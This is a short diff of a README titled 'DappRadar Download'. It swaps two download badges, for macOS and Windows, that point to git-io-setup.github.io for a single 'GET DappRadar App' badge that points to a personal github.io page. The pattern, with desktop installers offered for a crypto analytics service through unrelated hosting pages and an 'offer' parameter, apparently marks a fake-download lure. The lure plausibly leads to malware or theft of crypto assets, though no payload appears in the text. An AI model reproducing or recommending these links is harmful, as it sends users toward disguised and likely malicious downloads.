@@ -1,18 +1,7 @@
 # DappRadar Download — DApp Analytics Platform
 
-<a href="https://git-io-setup.github.io/.github/?offer=DappRadar" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/DappRadar%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="DappRadar for macOS">
-</a>
+[![GET DappRadar App](https://img.shields.io/badge/GET%20%E2%80%94%20DappRadar-App-0078D6?style=for-the-badge&logoColor=white)](https://aishaaspri.github.io/.github/DappRadar-App)
 
-<a href="https://git-io-setup.github.io/.github/?offer=DappRadar" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/DappRadar%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="DappRadar for Windows">
-</a>
 
 ---
 
